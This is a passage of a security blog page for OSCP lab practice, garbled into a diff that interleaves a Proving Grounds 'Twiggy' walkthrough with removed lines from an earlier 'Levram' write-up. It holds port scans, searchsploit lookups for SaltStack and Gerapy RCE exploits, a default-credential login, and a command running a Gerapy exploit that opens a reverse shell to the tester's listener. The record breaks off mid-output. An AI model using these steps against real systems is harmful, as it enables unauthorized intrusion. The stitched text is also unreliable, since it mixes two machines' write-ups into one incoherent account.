Image;r.src=t.currentSrc,r.decode().catch((()=>{})).then((()=>{t.style.opacity=1,o&&(o.style.opacity=0,o.style.transition="opacity 500ms linear")}))}),!0);</script><link rel="sitemap" type="application/xml" href="/sitemap-index.xml"/></head><body><div id="___gatsby"><div style="outline:none" tabindex="-1" id="gatsby-focus-wrapper"><style data-emotion="css 13ku56z">.css-13ku56z{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-flex-direction:column;-ms-flex-direction:column;flex-direction:column;height:100%;}</style><main class="css-13ku56z e1strnqo0"><style data-emotion="css-global 14hvnrk">@import url('https://fonts.googleapis.com/css2?family=Nanum+Myeongjo:wght@400;700;800&display=swap');*{padding:0;margin:0;box-sizing:border-box;font-family:'Nanum Myeongjo',serif;}html,body,#___gatsby{height:100%;}a,a:hover{color:inherit;-webkit-text-decoration:none;text-decoration:none;cursor:pointer;}img{border:1px solid black;}</style><style data-emotion="css cm164m">.css-cm164m{position:-webkit-sticky;position:-webkit-sticky;position:sticky;z-index:1;top:0;width:100%;padding-top:20px;padding-bottom:20px;display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-box-pack:end;-ms-flex-pack:end;-webkit-justify-content:end;justify-content:end;-webkit-align-items:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;background-color:#7490b5;}@media (max-width: 768px){.css-cm164m{-webkit-flex-direction:column;-ms-flex-direction:column;flex-direction:column;text-align:center;}}</style><div class="css-cm164m e15l4yeg6"><style data-emotion="css 1yrcabi">.css-1yrcabi{display:none;font-size:24px;margin-right:30px;background-color:transparent;border:none;cursor:pointer;}@media (max-width: 768px){.css-1yrcabi{display:block;margin-left:20px;}}</style><button class="css-1yrcabi e15l4yeg1">☰</button><style data-emotion="css 16w8lq8">.css-16w8lq8{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-box-pack:end;-ms-flex-pack:end;-webkit-justify-content:end;justify-content:end;-webkit-align-items:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;}@media (max-width: 768px){.css-16w8lq8{-webkit-flex-direction:column;-ms-flex-direction:column;flex-direction:column;width:100%;display:none;}}</style><div class="css-16w8lq8 e15l4yeg0"><style data-emotion="css 1sav23y">.css-1sav23y{margin-right:10px;z-index:2;color:black;font-size:15px;font-weight:bold;font-family:'EliceDigitalBaeum';background-color:transparent;border:none;cursor:pointer;}</style><button class="css-1sav23y e15l4yeg5"><style data-emotion="css 2331mw">.css-2331mw{z-index:3;}.css-2331mw:hover{background-image:linear-gradient(transparent 60%, white 40%);}</style><a class="css-2331mw e15l4yeg3" href="/">Main</a></button><button class="css-1sav23y e15l4yeg5"><a class="css-2331mw e15l4yeg3" href="/search/">Search</a></button><button class="css-1sav23y e15l4yeg5"><a href="https://github.com/hosahn" class="css-2331mw e15l4yeg2">Github</a></button><button class="css-1sav23y e15l4yeg5"><a href="https://bottlenose-apology-5f4.notion.site/6cefa80ae2a642b8b2523495d3d4bcef" class="css-2331mw e15l4yeg2">About</a></button><button class="css-1sav23y e15l4yeg5"><a class="css-2331mw e15l4yeg3" href="/contact/">Contact</a></button></div></div><style data-emotion="css 16cz9yp">.css-16cz9yp{position:relative;width:100%;height:400px;}@media (max-width: 768px){.css-16cz9yp{height:300px;}}</style><div class="css-16cz9yp e1opi4mu1"><style data-emotion="css 1bjn9yo">.css-1bjn9yo{z-index:-1;width:100%;height:400px;object-fit:cover;-webkit-filter:brightness(0.25);filter:brightness(0.25);}@media (max-width: 768px){.css-1bjn9yo{height:300px;}}</style><div data-gatsby-image-wrapper="" style="position:absolute" class="gatsby-image-wrapper gatsby-image-wrapper-constrained css-1bjn9yo e1opi4mu0"><div style="max-width:662px;display:block"><img alt="" role="presentation" aria-hidden="true" src="data:image/svg+xml;charset=utf-8,%3Csvg%20height=&#x27;499&#x27;%20width=&#x27;662&#x27;%20xmlns=&#x27;http://www.w3.org/2000/svg&#x27;%20version=&#x27;1.1&#x27;%3E%3C/svg%3E" style="max-width:100%;display:block;position:static"/></div><img aria-hidden="true" data-placeholder-image="" style="opacity:1;transition:opacity 500ms linear" decoding="async" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAPCAYAAADkmO9VAAAACXBIWXMAAA7DAAAOwwHHb6hkAAACE0lEQVR42p2STVPaUBSG8wfaUQuYXPJJwkeCUSD4VcWiYIUQBCK0Oi6cLjqOi9ad3fQX9E8/vWDbcdx0YPHMee/JmXfOvXmVqFTBMF1KlZCgWmdrO8Kv1tANF8Mq0u70maQ3DC+njNPPxIOUTnfA8UkXyymTl3NCL/xD6XRi2qcXdM4H9OLRYrj14SOt0x5HrS4HuyfsHbR5fyz1UZfmfptquCcXqFP2G5T8SNKQOqIcRCjdeEb66Y7J5Jrx7CuT2S2T4ZTb5Ir06ob+6Jbk6o7L0YxE9maSwaXU8tzvDRn2BiRjuXk8JpFaKYdNvFJA4G9RLFapBCGeW8LWTfkUtry2i2l7mFKbho1jOpiWg2UVFj1rji1n5n3DQqk19mkcdAjDGuFWuKg7O5E0KqDpFprQyeRUspvagsyf+oyQ38SLnkBx/CblZg9d/oBidIEwPTQtj5BGf9FeIF7V11oReUuaeejuNnvTn0TjH9jBIblsFlUaq6pYCiVvFDAKPnqhSmP0RD15xAlbbGZzqxuaToW8HbDd/0bpMMXw6mzKN1HV/NIoqmYg5iGWG+7Ej/LqoQy1LTfMoOayS6NUozOi4xi3fk5y/4v90Xf0oI1wGwhvV9JcCqU1uGN4fY9/NOXLwxNn6QOiNkKvDVdCyayvs762Ri6zwds3b9mQWs2+WxlFE8ZzhrR5np61qq2Osmws/heb30kgs6aMvc20AAAAAElFTkSuQmCC" alt=""/><picture><source type="image/webp" data-srcset="/static/b66bba67c9face34aa386f068a317ffe/4ed23/twiggy-1.webp 166w,/static/b66bba67c9face34aa386f068a317ffe/9b988/twiggy-1.webp 331w,/static/b66bba67c9face34aa386f068a317ffe/69f45/twiggy-1.webp 662w" sizes="(min-width: 662px) 662px, 100vw"/><img data-gatsby-image-ssr="" data-main-image="" style="opacity:0" sizes="(min-width: 662px) 662px, 100vw" decoding="async" loading="lazy" data-src="/static/b66bba67c9face34aa386f068a317ffe/bb660/twiggy-1.png" data-srcset="/static/b66bba67c9face34aa386f068a317ffe/de6ac/twiggy-1.png 166w,/static/b66bba67c9face34aa386f068a317ffe/0078b/twiggy-1.png 331w,/static/b66bba67c9face34aa386f068a317ffe/bb660/twiggy-1.png 662w" alt="thumbnail"/></picture><noscript><picture><source type="image/webp" srcSet="/static/b66bba67c9face34aa386f068a317ffe/4ed23/twiggy-1.webp 166w,/static/b66bba67c9face34aa386f068a317ffe/9b988/twiggy-1.webp 331w,/static/b66bba67c9face34aa386f068a317ffe/69f45/twiggy-1.webp 662w" sizes="(min-width: 662px) 662px, 100vw"/><img data-gatsby-image-ssr="" data-main-image="" style="opacity:0" sizes="(min-width: 662px) 662px, 100vw" decoding="async" loading="lazy" src="/static/b66bba67c9face34aa386f068a317ffe/bb660/twiggy-1.png" srcSet="/static/b66bba67c9face34aa386f068a317ffe/de6ac/twiggy-1.png 166w,/static/b66bba67c9face34aa386f068a317ffe/0078b/twiggy-1.png 331w,/static/b66bba67c9face34aa386f068a317ffe/bb660/twiggy-1.png 662w" alt="thumbnail"/></picture></noscript><script type="module">const t="undefined"!=typeof HTMLImageElement&&"loading"in HTMLImageElement.prototype;if(t){const t=document.querySelectorAll("img[data-main-image]");for(let e of t){e.dataset.src&&(e.setAttribute("src",e.dataset.src),e.removeAttribute("data-src")),e.dataset.srcset&&(e.setAttribute("srcset",e.dataset.srcset),e.removeAttribute("data-srcset"));const t=e.parentNode.querySelectorAll("source[data-srcset]");for(let e of t)e.setAttribute("srcset",e.dataset.srcset),e.removeAttribute("data-srcset");e.complete&&(e.style.opacity=1,e.parentNode.parentNode.querySelector("[data-placeholder-image]").style.opacity=0)}}</script></div><style data-emotion="css m1156n">.css-m1156n{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-flex-direction:column;-ms-flex-direction:column;flex-direction:column;width:768px;height:100%;margin:0 auto;padding:60px 0;color:#ffffff;}@media (max-width: 768px){.css-m1156n{width:100%;padding:40px 20px;}}</style><div class="css-m1156n e1st1jau3"><style data-emotion="css gywgo7">.css-gywgo7{display:grid;place-items:center;width:40px;height:40px;border-radius:50%;background:#ffffff;color:#000000;font-size:22px;cursor:pointer;box-shadow:0 0 10px rgba(0, 0, 0, 0.3);}@media (max-width: 768px){.css-gywgo7{width:30px;height:30px;font-size:18px;}}</style><div class="css-gywgo7 e1st1jau2"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="arrow-left" class="svg-inline--fa fa-arrow-left " role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M9.4 233.4c-12.5 12.5-12.5 32.8 0 45.3l160 160c12.5 12.5 32.8 12.5 45.3 0s12.5-32.8 0-45.3L109.2 288 416 288c17.7 0 32-14.3 32-32s-14.3-32-32-32l-306.7 0L214.6 118.6c12.5-12.5 12.5-32.8 0-45.3s-32.8-12.5-45.3 0l-160 160z"></path></svg></div><style data-emotion="css gn4qtp">.css-gn4qtp{display:-webkit-box;overflow:hidden;overflow-wrap:break-word;margin-top:auto;text-overflow:ellipsis;white-space:normal;-webkit-line-clamp:2;-webkit-box-orient:vertical;font-size:45px;font-weight:800;}@media (max-width: 768px){.css-gn4qtp{font-size:30px;}}</style><div class="css-gn4qtp e1st1jau1">OSCP Prep: Proving Grounds : Twiggy</div><style data-emotion="css 3gcnt2">.css-3gcnt2{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-box-pack:justify;-webkit-justify-content:space-between;justify-content:space-between;-webkit-align-items:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;margin-top:10px;font-size:18px;font-weight:700;}@media (max-width: 768px){.css-3gcnt2{-webkit-flex-direction:column;-ms-flex-direction:column;flex-direction:column;-webkit-align-items:flex-start;-webkit-box-align:flex-start;-ms-flex-align:flex-start;align-items:flex-start;font-size:15px;font-weight:400;}}</style><div class="css-3gcnt2 e1st1jau0"><div>C-SEC / proving_grounds / full-machine / ENG</div><div>2024.09.06.</div></div></div></div><style data-emotion="css uo146q">.css-uo146q{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-flex-direction:column;-ms-flex-direction:column;flex-direction:column;width:768px;margin:0 auto;padding:100px 0;word-break:break-all;line-height:1.8;font-size:16px;font-weight:400;}.css-uo146q p{padding:3px 0;}.css-uo146q h1,.css-uo146q h2,.css-uo146q h3{font-weight:800;margin-bottom:30px;}.css-uo146q *+h1,.css-uo146q *+h2,.css-uo146q *+h3{margin-top:80px;}.css-uo146q hr+h1,.css-uo146q hr+h2,.css-uo146q hr+h3{margin-top:0;}.css-uo146q h1{font-size:30px;}.css-uo146q h2{font-size:25px;}.css-uo146q h3{font-size:20px;}.css-uo146q blockquote{margin:30px 0;padding:5px 15px;border-left:2px solid #000000;font-weight:800;}.css-uo146q ol,.css-uo146q ul{margin-left:20px;padding:30px 0;}.css-uo146q hr{border:1px solid #000000;margin:100px 0;}.css-uo146q a{color:#4263eb;-webkit-text-decoration:underline;text-decoration:underline;}.css-uo146q pre[class*='language-']{margin:30px 0;padding:15px;font-size:15px;}.css-uo146q pre[class*='language-']::-webkit-scrollbar-thumb{background:rgba(255, 255, 255, 0.5);border-radius:3px;}.css-uo146q code[class*='language-'],.css-uo146q pre[class*='language-']{tab-size:2;}@media (max-width: 768px){.css-uo146q{width:100%;padding:80px 20px;line-height:1.6;font-size:14px;}.css-uo146q h1{font-size:23px;}.css-uo146q h2{font-size:20px;}.css-uo146q h3{font-size:17px;}.css-uo146q img{width:100%;}.css-uo146q hr{margin:50px 0;}}</style><div class="css-uo146q e1ijh0y10"><h2>0. Machine Info</h2>
+<p>Twiggy is an medium community-rated machine from Proving Grounds, maybe little bit harder than other easy machines but still easy enough.</p>
+<blockquote>
+<p>Nothing more to say, let’s dive into the machine!</p>
+</blockquote>
 <h2>1. Recon</h2>
-<ul>
-<li>nmap</li>
-</ul>
-<div class="gatsby-highlight" data-language="text"><pre class="language-text"><code class="language-text">┌──(hosan㉿kali)-[~]
-└─$ sudo nmap 192.168.211.24 -T4 -p-       
-[sudo] password for hosan: 
-Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-05 13:13 EDT
-Nmap scan report for 192.168.211.24
-Host is up (0.029s latency).
-Not shown: 65533 closed tcp ports (reset)
+<p>Starting with nmap scan</p>
+<div class="gatsby-highlight" data-language="text"><pre class="language-text"><code class="language-text">┌──(hosan㉿kali)-[~/pg/twiggy]
+└─$ sudo nmap 192.168.135.62 -T4 -p- -v 
+\Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-06 02:20 EDT
+Initiating Ping Scan at 02:20
+SYN Stealth Scan Timing: About 51.50% done; ETC: 02:22 (0:00:57 remaining)
+Completed SYN Stealth Scan at 02:22, 94.33s elapsed (65535 total ports)
+Nmap scan report for 192.168.135.62
+Host is up (0.050s latency).
+Not shown: 65529 filtered tcp ports (no-response)
 PORT     STATE SERVICE
 22/tcp   open  ssh
+53/tcp   open  domain
+80/tcp   open  http
+4505/tcp open  unknown
+4506/tcp open  unknown
 8000/tcp open  http-alt
 
-Nmap done: 1 IP address (1 host up) scanned in 10.28 seconds</code></pre></div>
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 94.48 seconds
+           Raw packets sent: 131137 (5.770MB) | Rcvd: 376 (67.394KB)
+</code></pre></div>
 <ul>
-<li>port 22</li>
+<li>Port 22</li>
 </ul>
-<div class="gatsby-highlight" data-language="text"><pre class="language-text"><code class="language-text">PORT   STATE SERVICE VERSION
-22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
+<div class="gatsby-highlight" data-language="text"><pre class="language-text"><code class="language-text">┌──(hosan㉿kali)-[~/pg/twiggy]
+└─$ sudo nmap 192.168.135.62 -p22 -A -sC -sV
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-06 02:33 EDT
+Nmap scan report for 192.168.135.62
+Host is up (0.025s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)
 | ssh-hostkey: 
-|   256 b9:bc:8f:01:3f:85:5d:f9:5c:d9:fb:b6:15:a0:1e:74 (ECDSA)
-|_  256 53:d9:7f:3d:22:8a:fd:57:98:fe:6b:1a:4c:ac:79:67 (ED25519)
+|   2048 44:7d:1a:56:9b:68:ae:f5:3b:f6:38:17:73:16:5d:75 (RSA)
+|   256 1c:78:9d:83:81:52:f4:b0:1d:8e:32:03:cb:a6:18:93 (ECDSA)
+|_  256 08:c9:12:d9:7b:98:98:c8:b3:99:7a:19:82:2e:a3:ea (ED25519)
 Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
-Aggressive OS guesses: Linux 4.15 - 5.8 (95%), Linux 5.0 - 5.4 (95%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 (95%), Linux 5.0 - 5.5 (95%), Linux 3.1 (94%), Linux 3.2 (94%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), HP P2000 G3 NAS device (93%)
+Device type: general purpose|specialized|storage-misc
+Running (JUST GUESSING): Linux 3.X|4.X|5.X (91%), Crestron 2-Series (86%), HP embedded (85%), Oracle VM Server 3.X (85%)
+OS CPE: cpe:/o:linux:linux_kernel:3.13 cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5.1 cpe:/o:crestron:2_series cpe:/h:hp:p2000_g3 cpe:/o:oracle:vm_server:3.4.2 cpe:/o:linux:linux_kernel:4.1
+Aggressive OS guesses: Linux 3.13 (91%), Linux 3.10 - 4.11 (90%), Linux 3.2 - 4.9 (90%), Linux 5.1 (90%), Linux 3.18 (88%), Crestron XPanel control system (86%), Linux 3.16 (86%), HP P2000 G3 NAS device (85%), Oracle VM Server 3.4.2 (Linux 4.1) (85%)
 No exact OS matches for host (test conditions non-ideal).
-Network Distance: 4 hops
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-
-TRACEROUTE (using port 22/tcp)
-HOP RTT      ADDRESS
-1   28.77 ms 192.168.45.1
-2   28.51 ms 192.168.45.254
-3   37.19 ms 192.168.251.1
-4   37.45 ms 192.168.211.24
-
-OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 5.09 seconds</code></pre></div>
+</code></pre></div>
 <ul>
-<li>port 8000</li>
+<li>Port 80</li>
+</ul>
+<div class="gatsby-highlight" data-language="text"><pre class="language-text"><code class="language-text">┌──(hosan㉿kali)-[~/pg/twiggy]
+└─$ sudo nmap 192.168.135.62 -p80 -A -sC -sV
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-06 02:34 EDT
+Nmap scan report for 192.168.135.62
+Host is up (0.026s latency).
+
+PORT   STATE SERVICE VERSION
+80/tcp open  http    nginx 1.16.1
+|_http-title: Home | Mezzanine
+|_http-server-header: nginx/1.16.1</code></pre></div>
+<ul>
+<li>Port 4505, 4506, 8000</li>
 </ul>
 <div class="gatsby-highlight" data-language="text"><pre class="language-text"><code class="language-text">┌──(hosan㉿kali)-[~]
-└─$ sudo nmap 192.168.211.24 -T4 -p8000 -A -sC -sV -Pn
-[sudo] password for hosan: 
-Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-05 13:21 EDT
-Nmap scan report for 192.168.211.24
-Host is up (0.029s latency).
+└─$ sudo nmap 192.168.135.62 -p4505,4506,8000 -A -sC -sV
 
-PORT     STATE SERVICE  VERSION
-8000/tcp open  http-alt WSGIServer/0.2 CPython/3.10.6
-|_http-title: Gerapy
-|_http-server-header: WSGIServer/0.2 CPython/3.10.6</code></pre></div>
-<p>There is nothing special or common cve with versions above or any interesting interactions. Let’s start with webapp enumeration.</p>
-<h2>2. Initial Foothold</h2>
-<p>I tried a basic admin:admin, and I got in (…)</p>
-<p><span
-      class="gatsby-resp-image-wrapper"
-      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 521px; "
-    >
-      <a
-    class="gatsby-resp-image-link"
-    href="/static/a4033efa19a4fa8f33483360e61d7009/db56f/levram-1.png"
-    style="display: block"
-    target="_blank"
-    rel="noopener"
-  >
-    <span
-    class="gatsby-resp-image-background-image"
-    style="padding-bottom: 89.58333333333334%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAASCAYAAABb0P4QAAAACXBIWXMAAA7DAAAOwwHHb6hkAAACS0lEQVR42p2USW/TUBDH/VVo43hJUme1s9txVrIobaSQFEFFkMrSkjStEokIVSCkqt+AO1xZJXpDiAtX9gvf5s+854DibEI9/PTmjcf/mTfzbEGO5jGLEitw5v3/izAv5g1bhLmQYD7RqqTCbMCmlka6fBP55iHZKfIX4AlZEAlP0FmliE0Jc7Q3aZ/j9soK5aiN0/MLPDz7DF+8Dn+8SAnaSBRasKpd5GpdhDI1RLJ1FJs3YOR3uM2SuARZdWLIRKK4i9GTD+gNPyJevIt8o4Nb90cYn56jR+vx5Cn648cYPTrDncGEfGOUW3vY0LL/WiDM92B/+Ay9/nP4jCq0ZAW19m1sX9/nFWWvdmBWO7Dru1RZA2GqzmcUFyv8W6UnmEGmssd7yGw5kufZr2xlec8cnH6y3nlnhJb00OaIIfZymsRsKORXY9NnEQcpQkMgJBdLKmTXRQpn4Y+xF6kSmrhu1bEVL2AjkOL7VYjsNPOCLJMYdAd6KVBcI7RW0DmOxY/sZYRN3kcx6NjrkGY+BHcPYzkoOltJPJqDlqogkCxxex0s3i3IPjmapFc24AukoahJiJKBjNmAkSjD49WxSXiWIBIyxcvTwQhMTKZroDavITA6gv/oEIHhAwSO+1AHBxyN7ODJgPsWYP6De5D1Ar9mgqzTxVRS2JqcQP/9HvqXl9C/vUaMML6/4WvmxzuUfl1w28XXV4j9fIvopxeQEyXIYXt6ZDIUqwa11YW63VmKb4Vf3SEabd4291DYX0MzL8/Svw3Lclmmgn8ASWRt3bKUz88AAAAASUVORK5CYII='); background-size: cover; display: block;"
-  ></span>
-  <picture>
-          <source
-              srcset="/static/a4033efa19a4fa8f33483360e61d7009/a59e9/levram-1.webp 192w,
-/static/a4033efa19a4fa8f33483360e61d7009/0ca9f/levram-1.webp 384w,
-/static/a4033efa19a4fa8f33483360e61d7009/222ae/levram-1.webp 521w"
-              sizes="(max-width: 521px) 100vw, 521px"
-              type="image/webp"
-            />
-          <source
-            srcset="/static/a4033efa19a4fa8f33483360e61d7009/3b721/levram-1.png 192w,
-/static/a4033efa19a4fa8f33483360e61d7009/66595/levram-1.png 384w,
-/static/a4033efa19a4fa8f33483360e61d7009/db56f/levram-1.png 521w"
-            sizes="(max-width: 521px) 100vw, 521px"
-            type="image/png"
-          />
-          <img
-            class="gatsby-resp-image-image"
-            src="/static/a4033efa19a4fa8f33483360e61d7009/db56f/levram-1.png"
-            alt="levram-1"
-            title=""
-            loading="lazy"
-            decoding="async"
-            style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
-          />
-        </picture>
-  </a>
-    </span></p>
-<p>Then, the footer revealed that they have Gerapy 0.9.6 running behind the webapp. Since Subdirectory enumeration didn’t work well, I started to search CVE for Gerapy</p>
-<p>Quick search for CVE:</p>
+[sudo] password for hosan: 
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-06 02:34 EDT
+Nmap scan report for 192.168.135.62
+Host is up (0.025s latency).
+
+PORT     STATE SERVICE VERSION
+4505/tcp open  zmtp    ZeroMQ ZMTP 2.0
+4506/tcp open  zmtp    ZeroMQ ZMTP 2.0
+8000/tcp open  http    nginx 1.16.1
+|_http-open-proxy: Proxy might be redirecting requests
+|_http-server-header: nginx/1.16.1
+|_http-title: Site doesn't have a title (application/json).
+</code></pre></div>
+<p>So we have 2 webapps (80, 8000), DNS, zmtp and ssh. Let’s start with enumeration</p>
+<h2>2. Enumeration</h2>
+<p>Since we don’t have any domain name it will be hard to enumerate DNS. Let’s start with zmtp</p>
+<ul>
+<li>zmtp service</li>
+</ul>
+<p>After googling for a while:</p>
+<p><a href="https://packetstormsecurity.com/files/157678/SaltStack-Salt-Master-Minion-Unauthenticated-Remote-Code-Execution.html" target="_blank" rel="nofollow">https://packetstormsecurity.com/files/157678/SaltStack-Salt-Master-Minion-Unauthenticated-Remote-Code-Execution.html</a></p>
 <div class="gatsby-highlight" data-language="text"><pre class="language-text"><code class="language-text">┌──(hosan㉿kali)-[~]
-└─$ searchsploit gerapy          
+└─$ searchsploit saltstack
 ---------------------------------------------------------------------------------------------- ---------------------------------
  Exploit Title                                                                                |  Path
 ---------------------------------------------------------------------------------------------- ---------------------------------
-Gerapy 0.9.7 - Remote Code Execution (RCE) (Authenticated)                                    | python/remote/50640.py
+Saltstack 3000.1 - Remote Code Execution                                                      | multiple/remote/48421.txt
 ---------------------------------------------------------------------------------------------- ---------------------------------
-Shellcodes: No Results</code></pre></div>
-<p>That’s exactly what we need!</p>
-<p>For this exploit, we need more than one project. But as we can see from the first image, we have no projects right now, so I simply created a project.</p>
+Shellcodes: No Results
+</code></pre></div>
+<p>Let’s try it later. Moving to WebApp</p>
+<ul>
+<li>Webapp</li>
+</ul>
+<p>Visiting port 8000, I found following json-format output:</p>
 <p><span
       class="gatsby-resp-image-wrapper"
-      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 768px; "
+      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 662px; "
     >
       <a
     class="gatsby-resp-image-link"
-    href="/static/9471ca89f8d8a207b93866bfc7f30641/a2afc/levram-2.png"
+    href="/static/b66bba67c9face34aa386f068a317ffe/46b67/twiggy-1.png"
     style="display: block"
     target="_blank"
     rel="noopener"
   >
     <span
     class="gatsby-resp-image-background-image"
-    style="padding-bottom: 25.520833333333332%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAYAAABFA8wzAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAA2klEQVR42p2MT0tCQRTF53PF2xVqfxYVUhBRm7SM3lN571Vu/FwimOBC0C/SKo0Q483Mm59zjWlniy78mDPn3HNV9eSSyvEFzWbM82ufLOvR7uTEcUrSznlKclqP3Z08tDrESUbqe0n6gqrW74lqVwzHU2S+rUG7Eo3gthT+/xeyv1ivmC/fUZXzBnu1a0aT2fagtRZblv4MOOcII7r0ftAhEy/4he+qg7MG0eEtb5P5j1lotDYYY3+x8npPsqBDJruC+LowqP3TO6KjGwajqS9YPhZfLD9X/2YDEgVT51VFnWkAAAAASUVORK5CYII='); background-size: cover; display: block;"
+    style="padding-bottom: 75.52083333333334%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAPCAYAAADkmO9VAAAACXBIWXMAAA7DAAAOwwHHb6hkAAACE0lEQVR42p2STVPaUBSG8wfaUQuYXPJJwkeCUSD4VcWiYIUQBCK0Oi6cLjqOi9ad3fQX9E8/vWDbcdx0YPHMee/JmXfOvXmVqFTBMF1KlZCgWmdrO8Kv1tANF8Mq0u70maQ3DC+njNPPxIOUTnfA8UkXyymTl3NCL/xD6XRi2qcXdM4H9OLRYrj14SOt0x5HrS4HuyfsHbR5fyz1UZfmfptquCcXqFP2G5T8SNKQOqIcRCjdeEb66Y7J5Jrx7CuT2S2T4ZTb5Ir06ob+6Jbk6o7L0YxE9maSwaXU8tzvDRn2BiRjuXk8JpFaKYdNvFJA4G9RLFapBCGeW8LWTfkUtry2i2l7mFKbho1jOpiWg2UVFj1rji1n5n3DQqk19mkcdAjDGuFWuKg7O5E0KqDpFprQyeRUspvagsyf+oyQ38SLnkBx/CblZg9d/oBidIEwPTQtj5BGf9FeIF7V11oReUuaeejuNnvTn0TjH9jBIblsFlUaq6pYCiVvFDAKPnqhSmP0RD15xAlbbGZzqxuaToW8HbDd/0bpMMXw6mzKN1HV/NIoqmYg5iGWG+7Ej/LqoQy1LTfMoOayS6NUozOi4xi3fk5y/4v90Xf0oI1wGwhvV9JcCqU1uGN4fY9/NOXLwxNn6QOiNkKvDVdCyayvs762Ri6zwds3b9mQWs2+WxlFE8ZzhrR5np61qq2Osmws/heb30kgs6aMvc20AAAAAElFTkSuQmCC'); background-size: cover; display: block;"
   ></span>
   <picture>
           <source
-              srcset="/static/9471ca89f8d8a207b93866bfc7f30641/a59e9/levram-2.webp 192w,
-/static/9471ca89f8d8a207b93866bfc7f30641/0ca9f/levram-2.webp 384w,
-/static/9471ca89f8d8a207b93866bfc7f30641/dc9b9/levram-2.webp 768w,
-/static/9471ca89f8d8a207b93866bfc7f30641/e2c2f/levram-2.webp 1152w,
-/static/9471ca89f8d8a207b93866bfc7f30641/f3efb/levram-2.webp 1536w,
-/static/9471ca89f8d8a207b93866bfc7f30641/8cffa/levram-2.webp 1914w"
-              sizes="(max-width: 768px) 100vw, 768px"
+              srcset="/static/b66bba67c9face34aa386f068a317ffe/a59e9/twiggy-1.webp 192w,
+/static/b66bba67c9face34aa386f068a317ffe/0ca9f/twiggy-1.webp 384w,
+/static/b66bba67c9face34aa386f068a317ffe/82a5e/twiggy-1.webp 662w"
+              sizes="(max-width: 662px) 100vw, 662px"
               type="image/webp"
             />
           <source
-            srcset="/static/9471ca89f8d8a207b93866bfc7f30641/3b721/levram-2.png 192w,
-/static/9471ca89f8d8a207b93866bfc7f30641/66595/levram-2.png 384w,
-/static/9471ca89f8d8a207b93866bfc7f30641/fe486/levram-2.png 768w,
-/static/9471ca89f8d8a207b93866bfc7f30641/d2d74/levram-2.png 1152w,
-/static/9471ca89f8d8a207b93866bfc7f30641/e8464/levram-2.png 1536w,
-/static/9471ca89f8d8a207b93866bfc7f30641/a2afc/levram-2.png 1914w"
-            sizes="(max-width: 768px) 100vw, 768px"
+            srcset="/static/b66bba67c9face34aa386f068a317ffe/3b721/twiggy-1.png 192w,
+/static/b66bba67c9face34aa386f068a317ffe/66595/twiggy-1.png 384w,
+/static/b66bba67c9face34aa386f068a317ffe/46b67/twiggy-1.png 662w"
+            sizes="(max-width: 662px) 100vw, 662px"
             type="image/png"
           />
           <img
             class="gatsby-resp-image-image"
-            src="/static/9471ca89f8d8a207b93866bfc7f30641/fe486/levram-2.png"
+            src="/static/b66bba67c9face34aa386f068a317ffe/46b67/twiggy-1.png"
             alt="levram-2"
             title=""
             loading="lazy"
@@ -158,73 +144,51 @@ Shellcodes: No Results</code></pre></div>
         </picture>
   </a>
     </span></p>
-<p>Then I executed the script, got my shell.</p>
-<div class="gatsby-highlight" data-language="text"><pre class="language-text"><code class="language-text">┌──(hosan㉿kali)-[~/pg/levram]
-└─$ python3 50640.py -t 192.168.211.24 -p 8000 -L 192.168.45.230 -P 443
-  ______     _______     ____   ___ ____  _       _  _  _____  ___ ____ _____ 
- / ___\ \   / / ____|   |___ \ / _ \___ \/ |     | || ||___ / ( _ ) ___|___  |
-| |    \ \ / /|  _| _____ __) | | | |__) | |_____| || |_ |_ \ / _ \___ \  / / 
-| |___  \ V / | |__|_____/ __/| |_| / __/| |_____|__   _|__) | (_) |__) |/ /  
- \____|  \_/  |_____|   |_____|\___/_____|_|        |_||____/ \___/____//_/   
-                                                                              
-
-Exploit for CVE-2021-43857
-For: Gerapy &lt; 0.9.8
-[*] Resolving URL...
-[*] Logging in to application...
-[*] Login successful! Proceeding...
-{'Authorization': 'Token b58db15bafeac901558a5da07b2b894f1f2b7111'}
-[*] Getting the project list
-[{"name": "exploit"}]
